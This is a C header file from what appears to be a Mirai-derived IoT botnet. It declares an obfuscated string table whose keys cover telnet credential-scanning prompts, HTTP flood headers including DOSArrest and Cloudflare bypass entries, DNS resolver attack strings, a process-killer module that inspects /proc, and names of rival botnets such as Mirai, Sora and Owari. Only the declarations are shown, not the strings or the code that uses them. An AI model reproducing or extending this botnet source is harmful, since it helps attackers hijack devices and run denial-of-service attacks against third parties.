#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};
#define TABLE_SCAN_DOMAIN				1
		
#define TABLE_EXEC_SUCCESS				2
		
#define TABLE_ATK_VSE					3
		
#define TABLE_SCAN_OGIN					4
#define TABLE_SCAN_ENTER				5
#define TABLE_SCAN_ASSWORD				6
#define TABLE_SCAN_QUERY				7
#define TABLE_SCAN_RESP					8
#define TABLE_SCAN_NCORRECT				9
#define TABLE_SCAN_ENABLE				10
#define TABLE_SCAN_SYSTEM				11
#define TABLE_SCAN_SHELL				12
#define TABLE_SCAN_SH					13


#define TABLE_ATK_KEEP_ALIVE            14
#define TABLE_ATK_ACCEPT                15
#define TABLE_ATK_ACCEPT_LNG            16
#define TABLE_ATK_CONTENT_TYPE          17
#define TABLE_ATK_SET_COOKIE            18
#define TABLE_ATK_REFRESH_HDR           19
#define TABLE_ATK_LOCATION_HDR          20
#define TABLE_ATK_SET_COOKIE_HDR        21
#define TABLE_ATK_CONTENT_LENGTH_HDR    22
#define TABLE_ATK_TRANSFER_ENCODING_HDR 23
#define TABLE_ATK_CHUNKED               24
#define TABLE_ATK_KEEP_ALIVE_HDR        25
#define TABLE_ATK_CONNECTION_HDR        26
#define TABLE_ATK_DOSARREST             27
#define TABLE_ATK_CLOUDFLARE_NGINX      28

#define TABLE_HTTP_ONE                  29
#define TABLE_HTTP_TWO                  30
#define TABLE_HTTP_THREE                31
#define TABLE_HTTP_FOUR                 32 
#define TABLE_HTTP_FIVE                 33

#define TABLE_ATK_HTTP					34
#define TABLE_ATK_USERAGENT 			35  
#define TABLE_ATK_HOST					36  
#define TABLE_ATK_COOKIE				37 
#define TABLE_ATK_SEARCHHTTP			38 
#define TABLE_ATK_URL                   39 
#define TABLE_ATK_POST					40

#define TABLE_ATK_RESOLVER				41
#define TABLE_ATK_NSERV					42

#define TABLE_KILLER_PROC				43
#define TABLE_KILLER_EXE				44
#define TABLE_KILLER_FD					45
#define TABLE_KILLER_TCP				46

#define TABLE_KILLER_MAPS				47

#define TABLE_EXEC_MIRAI				48
#define TABLE_EXEC_MANA					49
#define TABLE_EXEC_SORA1				50
#define TABLE_EXEC_SORA2				51
#define TABLE_EXEC_SORA3				52
#define TABLE_EXEC_OWARI 				53
#define TABLE_EXEC_JOSHO				54
#define TABLE_EXEC_APOLLO				55
#define TABLE_EXEC_HOHO					56
#define TABLE_EXEC_ARES					57
#define TABLE_EXEC_YAKUZA				58
#define TABLE_EXEC_APEX					59
#define TABLE_EXEC_OWARI2				60


#define TABLE_MAX_KEYS  				61

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
